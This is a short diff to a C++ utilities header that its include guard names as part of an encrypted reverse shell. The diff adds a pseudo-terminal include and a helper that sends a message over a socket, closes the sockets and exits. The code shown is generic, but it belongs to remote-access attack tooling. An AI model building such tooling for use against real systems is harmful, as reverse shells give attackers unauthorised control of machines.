@@ -10,6 +10,7 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/wait.h>
+#include <pty.h>
 
 inline char* toLower(char* arg) {
 
@@ -57,6 +58,15 @@ inline bool checkIfIpAddr(char* arg) {
     else {
         return true;
     }
+}
+
+inline void safeShutdown(const std::string& msgToSnd, const int socket, const int socket_fd) {
+    std::cout << msgToSnd << std::endl;
+    const char *message = msgToSnd.c_str();
+    send(socket, message, strlen(message), 0);
+    close(socket);
+    close(socket_fd);
+    exit(EXIT_FAILURE);
 }
 
 #endif //ENCRYPTED_REV_SHELL_UTILS_H
